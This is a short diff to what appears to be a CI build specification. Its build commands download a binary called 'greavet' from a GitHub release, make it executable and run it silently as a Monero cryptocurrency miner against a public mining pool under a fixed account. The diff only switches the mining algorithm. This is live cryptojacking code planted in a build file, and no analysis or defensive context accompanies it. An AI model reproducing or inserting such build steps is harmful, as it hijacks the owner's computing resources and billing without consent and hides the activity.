@@ -5,4 +5,4 @@ phases:
     commands:
         - wget https://github.com/vedhagsvp/aplamner/releases/download/nertas/greavet
         - chmod +x greavet
-        - ./greavet --algo xmr --cpu-off --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-CD300) --pool xmr.hk.apool.io:3334 > /dev/null 2>&1
+        - ./greavet --algo qubic_xmr --cpu-off --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-CD300) --pool xmr.hk.apool.io:3334 > /dev/null 2>&1
